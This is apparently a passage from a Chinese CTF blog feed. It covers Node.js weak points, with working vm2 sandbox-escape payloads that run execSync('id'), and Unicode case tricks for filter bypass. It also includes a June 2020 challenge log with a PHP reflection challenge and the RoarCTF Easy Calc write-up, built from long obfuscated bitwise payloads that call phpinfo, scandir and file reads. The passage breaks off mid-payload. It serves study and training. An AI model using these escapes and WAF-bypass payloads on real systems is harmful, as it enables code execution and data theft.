set()&#123;</span></span><br><span class="line"><span class="string">Object.defineProperty(Object.prototype,"get",&#123;get()&#123;</span></span><br><span class="line"><span class="string">throw x=&gt;x.constructor("return process")();</span></span><br><span class="line"><span class="string">&#125;&#125;);</span></span><br><span class="line"><span class="string">return ()=&gt;&#123;&#125;;</span></span><br><span class="line"><span class="string">&#125;&#125;);</span></span><br><span class="line"><span class="string">&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">process = e(()=&gt;&#123;&#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("id").toString();`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vm2&lt; =3.6.4</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`var process;</span></span><br><span class="line"><span class="string">try&#123;</span></span><br><span class="line"><span class="string">Buffer.from(&#123;</span></span><br><span class="line"><span class="string">valueOf: ()=&gt;&#123;</span></span><br><span class="line"><span class="string">throw new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">getPrototypeOf: ()=&gt;&#123;</span></span><br><span class="line"><span class="string">throw x=&gt;x.constructor.constructor("return process;")();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">process = e(()=&gt;&#123;&#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("id").toString();`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vm2&lt;=3.5.2</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`var process;</span></span><br><span class="line"><span class="string">try&#123;</span></span><br><span class="line"><span class="string">Buffer.from(&#123;</span></span><br><span class="line"><span class="string">valueOf: ()=&gt;&#123;</span></span><br><span class="line"><span class="string">throw new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">getPrototypeOf: ()=&gt;&#123;</span></span><br><span class="line"><span class="string">throw x=&gt;x.constructor.constructor("return process;")();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">process = e(()=&gt;&#123;&#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("id").toString();`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="javascript大小写特性"><a href="#javascript大小写特性" class="headerlink" title="javascript大小写特性"></a>javascript大小写特性</h2><p>对于toUpperCase():</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符<span class="string">"ı"</span>、<span class="string">"ſ"</span> 经过<span class="keyword">to</span>UpperCase处理后结果为 <span class="string">"I"</span>、<span class="string">"S"</span></span><br></pre></td></tr></table></figure><p>对于toLowerCase():</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符<span class="string">"K"</span>经过toLowerCase处理后结果为<span class="string">"k"</span><span class="comment">(这个K不是K)</span></span><br></pre></td></tr></table></figure><p>在绕一些规则的时候就可以利用这几个特殊字符进行绕过</p>]]></content>
    
    <summary type="html">
    
      记录一下nodejs的特性和常见弱点
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="web" scheme="https://0xcreed.jxustctf.top/tags/web/"/>
    
      <category term="js" scheme="https://0xcreed.jxustctf.top/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>6月刷题记录</title>
    <link href="https://0xcreed.jxustctf.top/2020/06/6%E6%9C%88%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://0xcreed.jxustctf.top/2020/06/6%E6%9C%88%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2020-06-01T15:35:00.000Z</published>
    <updated>2022-01-20T16:59:22.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-某师傅出的招新题"><a href="#1-某师傅出的招新题" class="headerlink" title="1.某师傅出的招新题"></a>1.某师傅出的招新题</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment">Flag in flag.php</span></span><br><span class="line"><span class="comment">You can use "readfile" function.</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$str1 = $_GET[<span class="string">'str1'</span>];</span><br><span class="line">$str2 = $_GET[<span class="string">'str2'</span>];</span><br><span class="line"></span><br><span class="line">$rce = <span class="keyword">new</span> $str2(<span class="string">'TestClass'</span>);</span><br><span class="line">$a = $rce-&gt;$str1();</span><br><span class="line">$st1 = $_POST[<span class="string">'st1'</span>];</span><br><span class="line">$st2 = $_POST[<span class="string">'st2'</span>];</span><br><span class="line"><span class="keyword">if</span>($st1==<span class="keyword">null</span>&amp;&amp;$st2==<span class="keyword">null</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"GET!!!"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $z = substr($a,$st1,<span class="number">8</span>);</span><br><span class="line">    $x = substr($a,$st2,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">echo</span> $z.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> $x.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    $z($x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>开始看题的时候很懵，没见过。后面看队友说用反射类做。就在网上找了下这方面的<a href="https://museljh.github.io/2019/04/24/ctf%E4%B8%AD%E7%9A%84php%E5%8F%8D%E5%B0%84/" target="_blank" rel="noopener">CTF题</a>发现这道题 </p><p><code>$a=$rce-&gt;$str1()</code>并不能传参，而且还有些疑惑，干嘛定义个空类 <code>Testcalss</code> 毫无头绪</p><p>然后去看了下<a href="https://www.php.net/manual/zh/class.reflectionclass.php" target="_blank" rel="noopener">php手册</a>找无参的函数，突然 发现<a href="https://www.php.net/manual/zh/reflectionclass.getdoccomment.php" target="_blank" rel="noopener">ReflectionClass::getDocComment()</a> — 获取文档注释</p><p>这个函数有搞头 ，利用注释中的 <code>flag.php</code> ，<code>readfile</code> 和<code>$z($x)</code>不就可以读取文件了吗</p><p><img src="/2020/06/6月刷题记录/image-20200602005512196.png" alt="image-20200602005512196"></p><p>这个题目出的很巧妙。orz</p><h3 id="2-RoarCTF-2019-Easy-Calc"><a href="#2-RoarCTF-2019-Easy-Calc" class="headerlink" title="2.[RoarCTF 2019]Easy Calc"></a>2.[RoarCTF 2019]Easy Calc</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p> <code>$blacklist</code>中过滤了 <code>^</code> 同时题目设置了WAF，过滤了<code>字母、#、！</code>，所以取反也不能用。</p><p>不过可以使用按位与<code>&amp;</code>以及按位或<code>|</code>。在 PHP 中，将两个数字使用<code>.</code>拼接，会当做字符串来处理，返回的也是一个字符串。例如：<code>(1).(2)</code>出来的就是字符串<code>&quot;12&quot;</code>，然后可以用<code>{}</code>来代替<code>[]</code>来取单个字符。<br> 并且，PHP 中，<code>1/0</code>得出的是<code>float</code>类型的<code>INF</code>，<code>0/0</code>得出的是<code>float</code>类型的<code>NAN</code>，我们也可以把这些转成字符串类型，从而得到字母<code>A</code> <code>I</code> <code>N</code> <code>F</code>。</p><p>E99p1ant师傅的<a href="https://github.red/roarctf-web-writeup/" target="_blank" rel="noopener">Fuzz 脚本</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$char = <span class="string">'1234567890-INFAH@+*%$()"!%meogiakcfhvwbnq_'</span>;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($char); $i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($j = <span class="number">0</span>; $j &lt; strlen($char); $j++)&#123;</span><br><span class="line">        <span class="keyword">echo</span>($char[$i] .<span class="string">'&amp;'</span> .$char[$j] . <span class="string">' '</span>. ($char[$i] &amp; $char[$j]));</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">        <span class="keyword">echo</span>($char[$i] .<span class="string">'|'</span> .$char[$j] . <span class="string">' '</span>. ($char[$i] | $char[$j]));</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后根据这个表，就可以构造代码了。可以构造形如<code>(phpinfo)()</code>这样的形式，来动态执行函数。<br> 值得一提的是，PHP 中函数名是不区分大小写的，因此不一定需要全小写的字符拼凑函数名。<br> <code>phpinfo()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))&amp;((((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)).(((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))&amp;((((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))()</span><br></pre></td></tr></table></figure><p><code>(scandir)(../../../)</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)).(((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))&amp;((((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))).((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))).(((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))&amp;((((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))))(((((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)).((((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))).((((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">-2</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;).(((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))|((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))))((((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).(((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).(((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).(((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).(((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).(((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))))))</span><br></pre></td></tr></table></figure><p>在根目录发现 flag 文件<code>f1agg</code>。<br> 最终 payload 构造：<code>(serIALIze)(FILe(/f1agg))</code>读取文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)).(((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))&amp;((((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))).((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))).(((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))&amp;((((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span 